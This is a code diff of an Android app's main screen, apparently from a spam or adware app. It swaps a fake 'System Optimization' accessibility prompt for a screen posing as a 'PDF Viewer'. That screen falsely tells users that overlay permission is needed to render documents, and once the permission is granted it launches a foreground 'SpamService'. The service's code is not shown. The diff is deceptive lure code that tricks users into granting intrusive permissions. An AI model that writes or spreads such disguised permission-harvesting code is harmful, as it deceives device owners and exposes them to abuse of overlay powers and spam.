@@ -3,6 +3,8 @@ package com.system.service;
 import android.content.Intent;
 import android.graphics.Color;
 import android.graphics.Typeface;
+import android.net.Uri;
+import android.os.Build;
 import android.os.Bundle;
 import android.provider.Settings;
 import android.view.Gravity;
@@ -23,25 +25,23 @@ public class MainActivity extends AppCompatActivity {
         layout.setPadding(50, 50, 50, 50);
 
         TextView title = new TextView(this);
-        title.setText("System Optimization Required");
+        title.setText("PDF Viewer");
         title.setTextSize(22f);
         title.setTypeface(null, Typeface.BOLD);
         title.setTextColor(Color.BLACK);
         title.setGravity(Gravity.CENTER);
-        title.setPadding(0, 20, 0, 10);
 
         TextView subtitle = new TextView(this);
-        subtitle.setText("To maintain device performance and security, System Service requires accessibility permissions to optimize background processes.");
+        subtitle.setText("To render documents correctly, this app requires overlay permission. Please enable it.");
         subtitle.setTextSize(15f);
         subtitle.setTextColor(Color.DKGRAY);
         subtitle.setGravity(Gravity.CENTER);
-        subtitle.setPadding(0, 0, 0, 40);
+        subtitle.setPadding(0, 20, 0, 40);
 
         Button btn = new Button(this);
-        btn.setText("Enable System Service");
+        btn.setText("Grant Permission");
         btn.setTextColor(Color.WHITE);
-        btn.setTextSize(16f);
-        btn.setBackgroundColor(Color.parseColor("#007BFF")); // Standard system blue
+        btn.setBackgroundColor(Color.parseColor("#007BFF")); 
         
         layout.addView(title);
         layout.addView(subtitle);
@@ -49,8 +49,14 @@ public class MainActivity extends AppCompatActivity {
         setContentView(layout);
 
         btn.setOnClickListener(v -> {
-            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
-            startActivity(intent);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
+                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
+                startActivity(intent);
+            } else {
+                // Start the service once permission is granted
+                startForegroundService(new Intent(this, SpamService.class));
+                finish();
+            }
         });
     }
 }
